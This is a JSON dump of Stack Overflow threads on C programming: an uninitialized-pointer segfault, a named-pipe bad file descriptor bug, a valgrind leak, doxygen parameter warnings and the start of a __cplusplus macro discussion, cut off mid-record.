"https://stackoverflow.com/questions/44927431/c-ok-in-main-but-segmentation-fault-when-inside-function/44927594#44927594", "title": "C. Ok in main but segmentation fault when inside function", "body": "<p>The <code>p</code> pointer is not initialized in both cases. It contains an undetermined value.</p>\n\n<p>Dereferencing an uninitialized pointer is <strong>undefined behaviour</strong> (google that).</p>\n\n<p>In the first case your pointer <code>p</code> happens  by chance to point somewhere where the dereferencement does not end up in a segfault (that is valid memory that your process is allowed to read), but in the second case it points to another location where dereferencement <em>does</em> end up in a segfault (dereferencement of memory that your process is <em>not</em> allowed to read).</p>\n"}], "owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 685, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1499312475, "creation_date": 1499260731, "last_edit_date": 1499312475, "question_id": 44927431, "link": "https://stackoverflow.com/questions/44927431/c-ok-in-main-but-segmentation-fault-when-inside-function", "title": "C. Ok in main but segmentation fault when inside function", "body": "<p>This piece of code gives a segmentation fault but If the test function body in written directly in the main function it works properly. So, what do you think is causing this problem? </p>\n\n<p>Segmentation fault:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint test()\n{\n    int i=0;\n    int *p;\n    printf(\"pass\\n\");\n    for (i = 0; i &lt; 24; i++)\n    {\n        printf(\"%d\\n\",i);\n        *(p+i) = i;\n        printf(\"%d\\n\",*(p+i));\n    }\n    return 1;\n\n}\n\nint main() {\n    int x = 0;\n    x = test();\n}\n</code></pre>\n\n<p>Working fine:</p>\n\n<pre><code>int main() {\n    int i=0;\n    int *p;\n    printf(\"pass\\n\");\n    for (i = 0; i &lt; 24; i++)\n    {\n        printf(\"%d\\n\",i);\n        *(p+i) = i;\n        printf(\"%d\\n\",*(p+i));\n    }\n}\n</code></pre>\n\n<p><strong>EDIT</strong>: Before throwing me with a bunch of down votes, please try the code. I know it is bad programming. I'm evaluating some C code exames and had a student that wrote this. Yes, not very good, but is a fact that the working version is actually working.</p>\n"}, {"tags": ["c", "linux", "pipe"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1499260898, "post_id": 44927302, "comment_id": 76830433, "body": "I cannot immediately explain the exact nature of the problem, but pipes are a mechanism for <i>inter-process</i> communication.  They are neither intended nor well-suited for a single process to communicate with itself."}, {"owner": {"reputation": 16538, "user_id": 1227152, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4hr5l.jpg?s=128&g=1", "display_name": "mustaccio", "link": "https://stackoverflow.com/users/1227152/mustaccio"}, "edited": false, "score": 0, "creation_date": 1499260899, "post_id": 44927302, "comment_id": 76830435, "body": "I guess you shouldn&#39;t be closing the pipe until you&#39;re done reading from it."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 16538, "user_id": 1227152, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4hr5l.jpg?s=128&g=1", "display_name": "mustaccio", "link": "https://stackoverflow.com/users/1227152/mustaccio"}, "edited": false, "score": 0, "creation_date": 1499261071, "post_id": 44927302, "comment_id": 76830562, "body": "Maybe, @mustaccio, but he opens the read and write ends as separate files, so that&#39;s not at all clear.  I suspect it&#39;s a combination of some or all of (1) opening both ends in non-blocking mode, (2) in the same process, <i>and</i> (3) closing the write end before the read."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1499261073, "post_id": 44927302, "comment_id": 76830565, "body": "maybe remove the<code>O_NONBLOCK</code> ?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1499261234, "post_id": 44927302, "comment_id": 76830693, "body": "Do also note that from a user program perspective, there are two distinct kinds of pipes in Linux: <i>named</i> pipes, a.k.a. FIFOs, and anonymous pipes created via the <code>pipe()</code> function.  The latter are by far the more commonly used."}, {"owner": {"reputation": 773, "user_id": 7991581, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f0ffccced69419766694f1774f275a3a?s=128&d=identicon&r=PG&f=1", "display_name": "Arkaik", "link": "https://stackoverflow.com/users/7991581/arkaik"}, "edited": false, "score": 0, "creation_date": 1499261407, "post_id": 44927302, "comment_id": 76830837, "body": "If I don&#39;t use the O_NONBLOCK the openning of the read descriptor is never passed. In my application, I need this process to create the pipe and then to poll the value in it, this value can then be modified by another process to change the behaviour of this process. It will basically be a deamon which watch the value in the pipe every x second. This value represent its working mode. The value 0 is written because it&#39;s its default configuration mode when the deamon is launched."}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1499261744, "post_id": 44927302, "comment_id": 76831105, "body": "Note this comment from the man pae: <i>However, it has to be open at both ends simultaneously before you can proceed to do any input or output operations on it.</i>  Also note <i>Opening a FIFO for reading normally blocks until some other process opens the same FIFO for writing, and vice versa.</i>. So it&#39;s really not intended to communicate within a single process."}, {"owner": {"reputation": 773, "user_id": 7991581, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f0ffccced69419766694f1774f275a3a?s=128&d=identicon&r=PG&f=1", "display_name": "Arkaik", "link": "https://stackoverflow.com/users/7991581/arkaik"}, "edited": false, "score": 0, "creation_date": 1499262318, "post_id": 44927302, "comment_id": 76831556, "body": "So if I understand well I should create the pipe and write the default value from the parent process and then fork this process, demonize it and at this moment I should be able to poll from the pipe without openning the write descriptor?"}], "answers": [{"comments": [{"owner": {"reputation": 773, "user_id": 7991581, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f0ffccced69419766694f1774f275a3a?s=128&d=identicon&r=PG&f=1", "display_name": "Arkaik", "link": "https://stackoverflow.com/users/7991581/arkaik"}, "edited": false, "score": 0, "creation_date": 1499263906, "post_id": 44928066, "comment_id": 76832725, "body": "Can&#39;t realize it was that simple... Thanks a lot for your help, it&#39;s working as I was expecting. Just a question, How can I write an integer from the shell into the pipe? Because when I&#39;m doing &quot;cat 4 &gt; test.fifo&quot; The read value change to 2612 but when I&#39;m doing this from another program it&#39;s ok."}, {"owner": {"reputation": 1056, "user_id": 4319483, "user_type": "registered", "profile_image": "https://graph.facebook.com/668992100/picture?type=large", "display_name": "Bjorn A.", "link": "https://stackoverflow.com/users/4319483/bjorn-a"}, "reply_to_user": {"reputation": 773, "user_id": 7991581, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f0ffccced69419766694f1774f275a3a?s=128&d=identicon&r=PG&f=1", "display_name": "Arkaik", "link": "https://stackoverflow.com/users/7991581/arkaik"}, "edited": false, "score": 0, "creation_date": 1499264136, "post_id": 44928066, "comment_id": 76832926, "body": "4 is just an ASCII value. You either need to convert it to a four byte integer or -- better -- read text in the program and convert it to an integer. (Maybe fdopen() and fscanf() can be useful? )"}, {"owner": {"reputation": 773, "user_id": 7991581, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f0ffccced69419766694f1774f275a3a?s=128&d=identicon&r=PG&f=1", "display_name": "Arkaik", "link": "https://stackoverflow.com/users/7991581/arkaik"}, "edited": false, "score": 0, "creation_date": 1499264399, "post_id": 44928066, "comment_id": 76833192, "body": "I though it was possible to tell to the shell to intepret 4 as a integer value. Whatever this is absolutely not related with the topic, I&#39;ll dig around later. Thanks again ;)"}], "tags": [], "owner": {"reputation": 1056, "user_id": 4319483, "user_type": "registered", "profile_image": "https://graph.facebook.com/668992100/picture?type=large", "display_name": "Bjorn A.", "link": "https://stackoverflow.com/users/4319483/bjorn-a"}, "is_accepted": true, "score": 1, "last_activity_date": 1499262391, "creation_date": 1499262391, "answer_id": 44928066, "question_id": 44927302, "link": "https://stackoverflow.com/questions/44927302/named-pipe-read-fail-with-bad-file-descriptor/44928066#44928066", "title": "Named pipe, read fail with bad file descriptor", "body": "<p>Your code has a couple of issues, which you would've found if you compiled it with all warnings enabled. If you use gcc, the following options are nice/mandatory:\n     -Wall -Wextra -Werror -pedantic </p>\n\n<p>One issue is that you don't assign the return value of open() to the file descriptors. You need to add braces around the assignment, or move it out of the if-statements. </p>\n\n<p>Here's a working example, using a thread to read:</p>\n\n<pre><code>#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;stdio.h&gt;\n\n#include &lt;pthread.h&gt;\n\nstatic void *reader(void *arg)\n{   \n    int fd, val;\n\n    if ((fd = open(\"test.fifo\", O_RDONLY)) == -1) {\n        perror(\"openRead\");\n        exit(EXIT_FAILURE);\n    }\n\n    if (read(fd, &amp;val, sizeof val) == -1)\n        perror(\"read\");\n    else\n        printf(\"Received value: %d\\n\", val);\n\n    close(fd);\n    return NULL;\n}\n\nint main(void)\n{   \n    int modePipeWrite, modePipeRead;\n    pthread_t readerid;\n\n\n    if (mkfifo(\"test.fifo\", 0777) == -1) {\n        perror(\"mkfifo\");\n        exit(EXIT_FAILURE);\n    }\n    pthread_create(&amp;readerid, NULL, reader, NULL);\n    sleep(1);\n\n    if ((modePipeWrite = open(\"test.fifo\", O_WRONLY)) == -1) {\n        perror(\"openWrite\");\n        exit(EXIT_FAILURE);\n    }\n\n    int n = 1234;\n\n    if (write(modePipeWrite, &amp;n, sizeof n) == -1)\n        perror(\"write\");\n    else\n        printf(\"Sent value: %d\\n\", n);\n\n    sleep(1);\n    close(modePipeWrite);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 773, "user_id": 7991581, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/f0ffccced69419766694f1774f275a3a?s=128&d=identicon&r=PG&f=1", "display_name": "Arkaik", "link": "https://stackoverflow.com/users/7991581/arkaik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1462, "favorite_count": 0, "accepted_answer_id": 44928066, "answer_count": 1, "score": 0, "last_activity_date": 1499262391, "creation_date": 1499260381, "question_id": 44927302, "link": "https://stackoverflow.com/questions/44927302/named-pipe-read-fail-with-bad-file-descriptor", "title": "Named pipe, read fail with bad file descriptor", "body": "<p>I'm beginning with pipes under Linux and I have a problem with my code.\nI wanted to test sending an integer through the fifo so I code a small program to test it.</p>\n\n<p>First I open the read only descriptor and then the write only one as precised in the documentation.\nI send the number to the pipe and close the write descriptor.</p>\n\n<p>However, when I'm trying to read from the pipe, it says that I have a bad file descriptor, I don't understand why it's not working because as the descriptor is the good one and is oppened with good option (O_RDONLY | O_NONBLOCK).</p>\n\n<p>Here is my code :</p>\n\n<pre><code>void main(void)\n{\n    int modePipeWrite, modePipeRead;\n\n    if(mkfifo(\"test.fifo\", 0777) == -1)\n    {\n        perror(\"mkfifo\");\n        exit(EXIT_FAILURE);\n    }\n    if(modePipeRead = open(\"test.fifo\", O_RDONLY | O_NONBLOCK) == -1)\n    {\n        perror(\"openRead\");\n        exit(EXIT_FAILURE);\n    }\n    if(modePipeWrite = open(\"test.fifo\", O_WRONLY | O_NONBLOCK) == -1)\n    {\n        perror(\"openWrite\");\n        exit(EXIT_FAILURE);\n    }\n\n\n    int n = 0;\n\n    if(write(modePipeWrite, &amp;n, sizeof(n)) == -1)\n    {\n        perror(\"write\");\n    }\n    printf(\"Send value: %d\\n\", n);\n\n    close(modePipeWrite);\n\n\n    int mode;\n\n    while(1)\n    {\n        if(read(modePipeRead, &amp;mode, sizeof(mode)) == -1)\n        {\n            perror(\"read\");\n        }\n        printf(\"Received value: %d\\n\", getpid(), mode);\n        sleep(1);\n    }\n}\n</code></pre>\n\n<p>And the output :</p>\n\n<pre><code>./a.out\nSend value: 0\n\nread: Bad file descriptor\nReceived value: -1877110288\n\nread: Bad file descriptor\nReceived value: -1877110288\n\nread: Bad file descriptor\nReceived value: -1877110288\n</code></pre>\n\n<p>I don't understand what could be wrong here. If someone have some advices I would be glad to hear it.</p>\n"}, {"tags": ["c", "memory-leaks", "valgrind"], "answers": [{"tags": [], "owner": {"reputation": 909, "user_id": 8041414, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f488d544c535a091b7310e7d7e6a98f7?s=128&d=identicon&r=PG&f=1", "display_name": "Jesferman", "link": "https://stackoverflow.com/users/8041414/jesferman"}, "is_accepted": true, "score": 2, "last_activity_date": 1499259847, "creation_date": 1499259847, "answer_id": 44927101, "question_id": 44927069, "link": "https://stackoverflow.com/questions/44927069/valgrind-definitely-lost-block-calling-function/44927101#44927101", "title": "valgrind definitely lost block calling function", "body": "<p>You have to call <code>free()</code> to free the memory reserved by <code>malloc</code> and <code>calloc</code> after you have finished using that memory.</p>\n"}], "owner": {"reputation": 37, "user_id": 7274191, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df1cab04974b97247c0d43ea1af5e2fe?s=128&d=identicon&r=PG&f=1", "display_name": "nazaninj72", "link": "https://stackoverflow.com/users/7274191/nazaninj72"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 162, "favorite_count": 0, "accepted_answer_id": 44927101, "answer_count": 1, "score": -1, "last_activity_date": 1499259901, "creation_date": 1499259748, "last_edit_date": 1499259901, "question_id": 44927069, "link": "https://stackoverflow.com/questions/44927069/valgrind-definitely-lost-block-calling-function", "title": "valgrind definitely lost block calling function", "body": "<p>I have a problem figuring out why I get definitely lost error in following code. I have changed return 0 to exit (0) in main function but it does not help. </p>\n\n<pre><code>struct s* function(int K,struct graph *G,int c){\n    uint32_t *a;\n    a=(uint32_t*)calloc(K+2,sizeof(uint32_t));\n    int *b;\n    b=(uint32_t*)calloc(K+2,sizeof(uint32_t));\n    return s;\n}\n\nint main(int argc, char *argv[])\n{\n    struct S* s=function(K,Gprime,capacity);\n    return 0;\n}\n</code></pre>\n\n<p>and Below you can see the S structure code:</p>\n\n<pre><code>struct S{\n    int *S;\n    uint32_t *Scount;\n};\n\nstruct S* Sp(int s,int k){\n    struct S* sz =malloc(sizeof (struct S));\n    sz-&gt;S = (int*)calloc(s+1, sizeof(int));\n    sz-&gt;scount=(uint32_t*)calloc(k+1,sizeof(uint32_t));\n    return sz;\n}\n</code></pre>\n\n<p>and here is the valgrind error : </p>\n\n<pre><code>==5343== 680 bytes in 5 blocks are definitely lost in loss record 10 of 52\n==5343==    at 0x4C272B8: calloc (vg_replace_malloc.c:566)\n==5343==    by 0x40106B: function (reflowk.c:3)\n==5343==    by 0x402BB0: main (reflowk.c:9)\n</code></pre>\n"}, {"tags": ["c++", "c", "doxygen"], "comments": [{"owner": {"reputation": 16907, "user_id": 4832499, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/76532994f6efa8d7dc8a3bb5b7b262a8?s=128&d=identicon&r=PG&f=1", "display_name": "Passer By", "link": "https://stackoverflow.com/users/4832499/passer-by"}, "edited": false, "score": 0, "creation_date": 1499257442, "post_id": 44924879, "comment_id": 76827694, "body": "There is no right or wrong here, people have differing opinions about things. Personally I would lean towards documenting everything as in <a href=\"http://en.cppreference.com/w/cpp/algorithm/max\" rel=\"nofollow noreferrer\">cppreference</a> style, its by far the best reference I&#39;ve seen."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1499258939, "post_id": 44924879, "comment_id": 76828910, "body": "If given a function where the parameters are named <code>a</code> and <code>b</code>, it is quite unclear what they do. This is not really self-documenting, better names would have been <code>obj1</code>, <code>obj2</code> or similar. Furthermore, a function named <code>max</code> is not self-documenting. Does it return the largest of the values? What if they are the same?  Does it return the largest value that something can have? Does it &quot;maximize&quot; something based on <code>a</code> and <code>b</code>?  Why would someone write a function for something so simple such as <code>if(a &gt; b) return a; else return b;</code> And so on. Some brief documentation <i>is</i> necessary."}, {"owner": {"reputation": 16110, "user_id": 248066, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d09a7ec374882cbccfdaea3d165ae3a1?s=128&d=identicon&r=PG", "display_name": "mtvec", "link": "https://stackoverflow.com/users/248066/mtvec"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499260995, "post_id": 44924879, "comment_id": 76830506, "body": "@Lundin: You&#39;re correct that some documentation would be necessary. My point was that, given a documentation string like &quot;Returns the maximum of two integers&quot;, it would be quite clear that <code>a</code> and <code>b</code> are those integers and do not need explicit documentation."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1499264151, "post_id": 44924879, "comment_id": 76832947, "body": "My guess: The thinking/discussion about whether a function is self-documenting or not is usually longer than just writing a trivial documentation. (I prefer the latter as this shows to the reader that the function is as trivial as it looks.)"}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1499264200, "post_id": 44924879, "comment_id": 76833001, "body": "Btw. what&#39;s trivial is not an &quot;exact science&quot;..."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499264566, "post_id": 44924879, "comment_id": 76833324, "body": "This is one of the reasons why I don&#39;t use such documentation tools. If the programmer gets constantly prompted to write documentation in various places, they&#39;ll get fed up and write something like <code>int a</code>: &quot;the integer variable a&quot; which is of course completely useless info."}, {"owner": {"reputation": 16110, "user_id": 248066, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d09a7ec374882cbccfdaea3d165ae3a1?s=128&d=identicon&r=PG", "display_name": "mtvec", "link": "https://stackoverflow.com/users/248066/mtvec"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1499266256, "post_id": 44924879, "comment_id": 76834705, "body": "@Lundin: Well that&#39;s exactly the reason I don&#39;t want those warnings. The problem is that all other Doxygen warnings seem to be perfectly valid so I don&#39;t want to disable them completely."}, {"owner": {"reputation": 374829, "user_id": 734069, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a356923f858fbe363dad1dc566837fc6?s=128&d=identicon&r=PG", "display_name": "Nicol Bolas", "link": "https://stackoverflow.com/users/734069/nicol-bolas"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499287043, "post_id": 44924879, "comment_id": 76847299, "body": "@Lundin: &quot;<i>If the programmer gets constantly prompted to write documentation in various places, they&#39;ll get fed up and write something like</i>&quot; And then you <i>fire them</i>. If a programmer can&#39;t be bothered to do route drudge work correctly, then how can you expect them to slog through whatever project they need to do?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 374829, "user_id": 734069, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a356923f858fbe363dad1dc566837fc6?s=128&d=identicon&r=PG", "display_name": "Nicol Bolas", "link": "https://stackoverflow.com/users/734069/nicol-bolas"}, "edited": false, "score": 0, "creation_date": 1499321539, "post_id": 44924879, "comment_id": 76857753, "body": "@NicolBolas If you force someone to use a &quot;quality&quot; tool which leads to nothing but bureaucracy, then these situations happen. Situations often caused by naive, incompetent management who don&#39;t understand how humans work. In order to force code documentation, you should rather state rules for how it must be done and add them to your company coding standard. And the best way to find lack of source code documentation is not through some tool but through peer review. Particularly when the project is mostly done and nobody can make excuses about not having enough time for it."}], "owner": {"reputation": 16110, "user_id": 248066, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d09a7ec374882cbccfdaea3d165ae3a1?s=128&d=identicon&r=PG", "display_name": "mtvec", "link": "https://stackoverflow.com/users/248066/mtvec"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 137, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1548600231, "creation_date": 1499253787, "last_edit_date": 1548600231, "question_id": 44924879, "link": "https://stackoverflow.com/questions/44924879/partial-parameter-documentation", "title": "Partial parameter documentation", "body": "<p>I believe that code should be as self-documenting as possible; the purpose of entities (variables, classes,...) should be clear from their name and/or type. In those cases where this self-documentation is sufficient, adding explicit documentation is distracting and should be avoided, I believe.</p>\n\n<p>For example, in the function</p>\n\n<pre><code>int max(int a, int b);\n</code></pre>\n\n<p>there really is no need to document the arguments; it is very clear from the signature what they mean.</p>\n\n<p>Of course, self-documentation is not always fully possible and there are cases where some of a function's arguments require explicit documentation.</p>\n\n<p>Unfortunately, doxygen issues warnings for undocumented parameters. At first sight, it may seem that the <a href=\"http://www.doxygen.nl/manual/config.html#cfg_warn_no_paramdoc\" rel=\"nofollow noreferrer\">WARN_NO_PARAMDOC</a> configuration option can help. However, it will only disable warnings if <em>all</em> parameters are undocumented. If some are documented and some not, doxygen issues a warning.</p>\n\n<p>So, I have a couple of questions:</p>\n\n<ul>\n<li>Why does doxygen have this behaviour? Am I maybe wrong in my believe that only parameters that are not self-documenting should be explicitly documented?</li>\n<li>Is there a workaround? (Short of adding empty <code>\\param</code> statements.)</li>\n</ul>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499253587, "post_id": 44924777, "comment_id": 76824869, "body": "Why should the behaviour be undefined?"}, {"owner": {"reputation": 145, "user_id": 8236602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a99d03c8669d887c379c3227edec564e?s=128&d=identicon&r=PG&f=1", "display_name": "Willy Wonka", "link": "https://stackoverflow.com/users/8236602/willy-wonka"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499253602, "post_id": 44924777, "comment_id": 76824876, "body": "Because it contains a double underscore."}, {"owner": {"reputation": 145, "user_id": 8236602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a99d03c8669d887c379c3227edec564e?s=128&d=identicon&r=PG&f=1", "display_name": "Willy Wonka", "link": "https://stackoverflow.com/users/8236602/willy-wonka"}, "edited": false, "score": 0, "creation_date": 1499253648, "post_id": 44924777, "comment_id": 76824905, "body": "I didn&#39;t. Someone else did."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1499253656, "post_id": 44924777, "comment_id": 76824910, "body": "@SouravGhosh I added the C++ tag, because it is somewhat C++ related after all."}, {"owner": {"reputation": 188064, "user_id": 635608, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oIJia.png?s=128&g=1", "display_name": "Mat", "link": "https://stackoverflow.com/users/635608/mat"}, "edited": false, "score": 0, "creation_date": 1499253657, "post_id": 44924777, "comment_id": 76824914, "body": "Why would the standard define something that you couldn&#39;t ever use? Makes no sense."}, {"owner": {"reputation": 7087, "user_id": 1389898, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00f2a3f2624a47edc48464d4929a7508?s=128&d=identicon&r=PG", "display_name": "dlmeetei", "link": "https://stackoverflow.com/users/1389898/dlmeetei"}, "edited": false, "score": 1, "creation_date": 1499253668, "post_id": 44924777, "comment_id": 76824923, "body": "Using __variable is discouraged as it is supposed to be used by implementation. Using  __cplusplus is fine"}, {"owner": {"reputation": 5623, "user_id": 1347519, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a9e1eb6e25803528d25f57f3df79e115?s=128&d=identicon&r=PG", "display_name": "Attie", "link": "https://stackoverflow.com/users/1347519/attie"}, "edited": false, "score": 4, "creation_date": 1499253672, "post_id": 44924777, "comment_id": 76824928, "body": "It&#39;s not <i>undefined</i>.... such identifier names are <i>reserved</i>... <a href=\"https://stackoverflow.com/a/25090719/1347519\">stackoverflow.com/a/25090719/1347519</a>"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499253721, "post_id": 44924777, "comment_id": 76824965, "body": "@MichaelWalz IMHO, C is suffice...but if you feel..it&#39;s OK."}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1499253796, "post_id": 44924777, "comment_id": 76825028, "body": "It&#39;s always valid to check if any macro is defined."}, {"owner": {"reputation": 145, "user_id": 8236602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a99d03c8669d887c379c3227edec564e?s=128&d=identicon&r=PG&f=1", "display_name": "Willy Wonka", "link": "https://stackoverflow.com/users/8236602/willy-wonka"}, "edited": false, "score": 1, "creation_date": 1499253810, "post_id": 44924777, "comment_id": 76825034, "body": "From what I&#39;ve observed, putting C and C++ together can incite the wrath of the downvoters. I was careful to only tag the principal language I was concerned with, and explain the relevant parts of the C++ in the actual question. I&#39;ve put it back."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499254426, "post_id": 44924777, "comment_id": 76825489, "body": "Writing code which will compiler as C and C++ correctly is pretty challenging and not really a good idea, there are way too many differences (VLAs, <code>const</code> and many more subtles). `__cplusplus`` and some other macros should only be used in (implementation) headers to allow using C functions in C++ compilation units."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": 